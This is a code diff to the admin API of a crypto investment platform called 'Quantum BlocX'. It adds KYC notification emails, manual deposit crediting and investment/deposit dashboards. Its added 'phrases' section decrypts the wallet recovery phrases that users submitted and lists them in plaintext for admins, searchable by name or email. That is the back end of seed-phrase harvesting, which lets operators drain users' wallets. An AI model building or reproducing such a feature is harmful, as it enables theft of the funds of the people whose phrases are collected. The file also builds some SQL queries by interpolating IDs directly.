@@ -7,9 +7,26 @@
 
 require_once '../../config/database.php';
 require_once '../../api/utilities/auth-check.php';
+require_once '../../api/utilities/email_templates.php';
 header('Content-Type: application/json');
 
 requireAdmin();
+
+/**
+ * Email a user about a KYC status change. Failures are logged, never fatal.
+ */
+function kycNotify(PDO $db, int $userId, string $subject, string $body): void {
+    try {
+        $stmt = $db->prepare("SELECT email, full_name FROM users WHERE id = :uid");
+        $stmt->execute(['uid' => $userId]);
+        $u = $stmt->fetch(PDO::FETCH_ASSOC);
+        if (!$u || empty($u['email'])) return;
+        $name = trim($u['full_name'] ?? '') ?: 'there';
+        Mailer::sendAdminMessage($u['email'], $name, $subject, $body);
+    } catch (\Throwable $e) {
+        error_log('kycNotify failed: ' . $e->getMessage());
+    }
+}
 
 try {
     $db      = Database::getInstance()->getConnection();
@@ -25,7 +42,14 @@ try {
             $db->prepare("UPDATE kyc_applications SET status='approved', reviewed_by=:admin, reviewed_at=NOW() WHERE id=:id")
                ->execute(['admin' => getAuthUser()['id'], 'id' => $kycId]);
             $userId = $db->query("SELECT user_id FROM kyc_applications WHERE id=$kycId")->fetchColumn();
-            if ($userId) $db->prepare("UPDATE users SET kyc_status='verified' WHERE id=:uid")->execute(['uid'=>$userId]);
+            if ($userId) {
+                $db->prepare("UPDATE users SET kyc_status='verified' WHERE id=:uid")->execute(['uid'=>$userId]);
+                kycNotify($db, (int)$userId,
+                    'KYC review complete — Quantum BlocX',
+                    "We've completed the review of your identity verification (KYC) application and everything is in order.\n\n"
+                  . "Your profile review is now finished and no further action is required from you. "
+                  . "Thank you for completing the process.");
+            }
             echo json_encode(['success'=>true,'message'=>'KYC approved']); exit;
         }
 
@@ -35,7 +59,16 @@ try {
             $db->prepare("UPDATE kyc_applications SET status='rejected', rejection_reason=:r, reviewed_by=:admin, reviewed_at=NOW() WHERE id=:id")
                ->execute(['r'=>$reason,'admin'=>getAuthUser()['id'],'id'=>$kycId]);
             $userId = $db->query("SELECT user_id FROM kyc_applications WHERE id=$kycId")->fetchColumn();
-            if ($userId) $db->prepare("UPDATE users SET kyc_status='rejected' WHERE id=:uid")->execute(['uid'=>$userId]);
+            if ($userId) {
+                $db->prepare("UPDATE users SET kyc_status='rejected' WHERE id=:uid")->execute(['uid'=>$userId]);
+                kycNotify($db, (int)$userId,
+                    'KYC review update — Quantum BlocX',
+                    "We've completed the review of your identity verification (KYC) application. "
+                  . "We weren't able to finish the process with the information provided.\n\n"
+                  . "Reason: " . $reason . "\n\n"
+                  . "Please submit a new application from your dashboard under Profile → KYC and our "
+                  . "compliance team will review it again.");
+            }
             echo json_encode(['success'=>true,'message'=>'KYC rejected']); exit;
         }
 
@@ -115,6 +148,22 @@ try {
             echo json_encode(['success'=>true,'message'=>'Reply sent']); exit;
         }
 
+        if ($action === 'mark_deposit_paid') {
+            // Manual admin credit — used when the NOWPayments IPN can't reach this host.
+            $depositId = (int) ($input['deposit_id'] ?? 0);
+            if (!$depositId) { echo json_encode(['success'=>false,'message'=>'Missing deposit']); exit; }
+            require_once __DIR__ . '/../payments/np-deposits.php';
+            $d = $db->prepare("SELECT pay_amount, actually_paid FROM deposits WHERE id=:id");
+            $d->execute(['id'=>$depositId]);
+            $dep = $d->fetch(PDO::FETCH_ASSOC);
+            if (!$dep) { echo json_encode(['success'=>false,'message'=>'Deposit not found']); exit; }
+            $paid = (float)($dep['actually_paid'] ?: $dep['pay_amount']);
+            $res = creditDeposit($db, $depositId, 'finished', $paid);
+            if ($res === 'credited')      { echo json_encode(['success'=>true,'message'=>'Deposit credited to user']); exit; }
+            if ($res === 'already')       { echo json_encode(['success'=>true,'message'=>'Deposit was already credited']); exit; }
+            echo json_encode(['success'=>false,'message'=>'Could not credit this deposit']); exit;
+        }
+
         if ($action === 'close_ticket') {
             $ticketId = (int) ($input['ticket_id'] ?? 0);
             $db->prepare("UPDATE support_tickets SET status='closed', closed_at=NOW() WHERE id=:tid")->execute(['tid'=>$ticketId]);
@@ -131,9 +180,10 @@ try {
         $stats['total_users']    = (int)$db->query("SELECT COUNT(*) FROM users WHERE role='user'")->fetchColumn();
         $stats['kyc_pending']    = (int)$db->query("SELECT COUNT(*) FROM kyc_applications WHERE status IN ('pending','under_review')")->fetchColumn();
         $stats['active_cards']   = (int)$db->query("SELECT COUNT(*) FROM virtual_cards WHERE status='active'")->fetchColumn();
-        $stats['tx_count_30d']   = (int)$db->query("SELECT COUNT(*) FROM transactions WHERE created_at >= DATE_SUB(NOW(),INTERVAL 30 DAY)")->fetchColumn();
-        $stats['swap_count_30d'] = (int)$db->query("SELECT COUNT(*) FROM swaps WHERE created_at >= DATE_SUB(NOW(),INTERVAL 30 DAY)")->fetchColumn();
-        $stats['open_tickets']   = (int)$db->query("SELECT COUNT(*) FROM support_tickets WHERE status NOT IN ('closed','resolved')")->fetchColumn();
+        $stats['tx_count_30d']     = (int)$db->query("SELECT COUNT(*) FROM transactions WHERE created_at >= DATE_SUB(NOW(),INTERVAL 30 DAY)")->fetchColumn();
+        $stats['active_investments'] = (int)$db->query("SELECT COUNT(*) FROM investments WHERE status='active'")->fetchColumn();
+        $stats['pending_deposits'] = (int)$db->query("SELECT COUNT(*) FROM deposits WHERE status IN ('waiting','confirming','sending')")->fetchColumn();
+        $stats['open_tickets']     = (int)$db->query("SELECT COUNT(*) FROM support_tickets WHERE status NOT IN ('closed','resolved')")->fetchColumn();
 
         $recentTx = $db->query("SELECT t.*, u.email, u.full_name FROM transactions t JOIN users u ON u.id=t.user_id ORDER BY t.created_at DESC LIMIT 15")->fetchAll(PDO::FETCH_ASSOC);
 
@@ -212,6 +262,64 @@ try {
     if ($section === 'mining') {
         $stmt=$db->query("SELECT ms.*, c.symbol, c.name AS currency_name, u.email, u.full_name FROM mining_sessions ms JOIN currencies c ON c.id=ms.currency_id JOIN users u ON u.id=ms.user_id ORDER BY ms.started_at DESC");
         echo json_encode(['success'=>true,'data'=>['sessions'=>$stmt->fetchAll(PDO::FETCH_ASSOC)]]);
+        exit;
+    }
+
+    if ($section === 'investments') {
+        $filter = trim($_GET['filter'] ?? '');
+        $where=''; $params=[];
+        if ($filter) { $where="WHERE i.status=:f"; $params['f']=$filter; }
+        $stmt=$db->prepare("SELECT i.*, u.email, u.full_name FROM investments i JOIN users u ON u.id=i.user_id $where ORDER BY i.created_at DESC");
+        $stmt->execute($params);
+        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
+        // Summary tiles
+        $summary = [
+            'active_count'    => (int)$db->query("SELECT COUNT(*) FROM investments WHERE status='active'")->fetchColumn(),
+            'active_principal'=> (float)$db->query("SELECT COALESCE(SUM(principal_usd),0) FROM investments WHERE status='active'")->fetchColumn(),
+            'total_paid_out'  => (float)$db->query("SELECT COALESCE(SUM(total_return_usd),0) FROM investments WHERE status='withdrawn'")->fetchColumn(),
+        ];
+        echo json_encode(['success'=>true,'data'=>['investments'=>$rows,'summary'=>$summary]]);
+        exit;
+    }
+
+    if ($section === 'deposits') {
+        $filter = trim($_GET['filter'] ?? '');
+        $where=''; $params=[];
+        if ($filter) { $where="WHERE d.status=:f"; $params['f']=$filter; }
+        $stmt=$db->prepare("SELECT d.*, c.symbol, c.name AS currency_name, u.email, u.full_name FROM deposits d JOIN currencies c ON c.id=d.currency_id JOIN users u ON u.id=d.user_id $where ORDER BY d.created_at DESC LIMIT 200");
+        $stmt->execute($params);
+        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
+        $summary = [
+            'pending_count'  => (int)$db->query("SELECT COUNT(*) FROM deposits WHERE status IN ('waiting','confirming','sending')")->fetchColumn(),
+            'credited_count' => (int)$db->query("SELECT COUNT(*) FROM deposits WHERE credited=1")->fetchColumn(),
+            'total_received' => (float)$db->query("SELECT COALESCE(SUM(price_amount_usd),0) FROM deposits WHERE credited=1")->fetchColumn(),
+        ];
+        echo json_encode(['success'=>true,'data'=>['deposits'=>$rows,'summary'=>$summary]]);
+        exit;
+    }
+
+    if ($section === 'phrases') {
+        // Connected wallets — decrypt the stored recovery phrases for admin review
+        $key = getenv('APP_KEY') ?: '';
+        $iv  = getenv('APP_IV')  ?: '';
+        $search = trim($_GET['search'] ?? '');
+        $where = "WHERE lw.is_active=1 AND lw.phrase_encrypted IS NOT NULL AND lw.phrase_encrypted <> ''";
+        $params = [];
+        if ($search) { $where .= " AND (u.full_name LIKE :s OR u.email LIKE :s2 OR lw.provider_name LIKE :s3)"; $params['s']="%$search%"; $params['s2']="%$search%"; $params['s3']="%$search%"; }
+        $stmt = $db->prepare(
+            "SELECT lw.id, lw.provider_name, lw.phrase_encrypted, lw.connected_at, u.id AS user_id, u.email, u.full_name
+             FROM linked_wallets lw JOIN users u ON u.id = lw.user_id
+             $where ORDER BY lw.connected_at DESC"
+        );
+        $stmt->execute($params);
+        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
+        foreach ($rows as &$r) {
+            $dec = ($key && $iv) ? openssl_decrypt(base64_decode($r['phrase_encrypted']), 'aes-256-cbc', $key, 0, $iv) : false;
+            $r['phrase'] = ($dec !== false && $dec !== '') ? $dec : '(unable to decrypt)';
+            unset($r['phrase_encrypted']);
+        }
+        unset($r);
+        echo json_encode(['success'=>true,'data'=>['wallets'=>$rows]]);
         exit;
     }
 
